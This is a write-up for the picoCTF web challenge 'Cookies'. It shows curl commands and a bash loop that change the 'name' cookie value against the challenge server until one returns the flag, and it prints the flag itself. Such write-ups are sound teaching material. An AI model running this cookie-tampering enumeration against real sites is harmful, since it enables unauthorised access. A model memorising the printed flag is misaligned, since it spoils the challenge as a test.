# Cookies
Category: Web, 40 points

## Description
> Who doesn't love cookies? Try to figure out the best one. 

## Solution

We visit the website and see the following message:

```html
<div class="col-xs-12 col-sm-12 col-md-12">
    <h3>Welcome to my cookie search page. See how much I like different kinds of cookies!</h3>
</div>
```

Let's check the cookie we get from the server:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/Cookies]
└─$ curl -s http://mercury.picoctf.net:27177/ -I | grep Cookie
Set-Cookie: name=-1; Path=/
```

What if we try to access with a different cookie name?

```console
┌──(user@kali)-[/media/sf_CTFs/pico/Cookies]
└─$ curl -s http://mercury.picoctf.net:27177/ -H "Cookie: name=0;" -L | grep -i Cookie
    <title>Cookies</title>
            <h3 class="text-muted">Cookies</h3>
          <!-- <strong>Title</strong> --> That is a cookie! Not very special though...
            <p style="text-align:center; font-size:30px;"><b>I love snickerdoodle cookies!</b></p>

```

Let's search for that special cookie by trying different numbers:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/Cookies]
└─$ for i in {1..20}; do
for>     contents=$(curl -s http://mercury.picoctf.net:27177/ -H "Cookie: name=$i; Path=/" -L)
for>     if ! echo "$contents" | grep -q "Not very special"; then
for then>         echo "Cookie #$i is special"
for then>         echo $contents | grep "pico"
for then>         break
for then>     fi
for> done
Cookie #18 is special
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_064663be}</code></p>
```

The flag: `picoCTF{3v3ry1_l0v3s_c00k135_064663be}`